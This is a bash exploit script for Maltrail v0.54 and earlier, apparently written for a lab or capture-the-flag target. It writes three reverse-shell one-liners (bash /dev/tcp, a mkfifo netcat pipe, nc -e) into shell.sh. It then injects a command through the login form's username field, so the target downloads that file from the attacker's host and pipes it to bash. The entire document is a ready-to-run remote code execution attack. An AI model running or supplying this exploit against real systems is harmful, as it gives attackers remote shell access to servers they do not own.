#!/bin/bash

#Maltrail <= v0.54

############################################################
Help()
{
   # Display Help
   echo "-u  		URL"
   echo "-l		LHOST"
   echo "-p		LPORT"
   echo "-w		WEBPORT"
   echo "Syntax: Mailtrail.sh -u <url> -l <LHOST> -p <LPORT> -w <WEBPORT>"
   echo "ex:  ./CVE-2023-27163.sh -u http://10.10.11.224:55555/carrot -l 10.10.10.1 -p 4444 -w 8080"
}

############################################################
# Process the input options. Add options as needed.        #
############################################################
# Get the options
while getopts "u:l:p:w:h" option; do
   case $option in
   	h) # display Help
	    Help
        exit;;
    u) # URL
		URL=${OPTARG};;
	l) #LHOST
		LHOST=${OPTARG};;
	p) #LPORT
		LPORT=${OPTARG};;
	w) #WEBPORT
		WEBPORT=${OPTARG};;
   esac
done

############################################################
# If no options are passed do the following        		   #
############################################################

if [ $# -eq 0 ]; then
    >&2 echo -e "$YELLOW" "No arguments provided"
    >&2 echo -e "$GREEN" "Use -h for help"
    exit 1
fi

echo "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1" > shell.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f" >> shell.sh
echo "nc -e /bin/bash ${LHOST} ${LPORT}" >> shell.sh

read -p "Start listener on port ${LPORT}, and start web server on port 80, press enter to continue"

curl "${URL}/login" --data 'username=;`curl '${LHOST}:${WEBPORT}'/shell.sh|bash`'
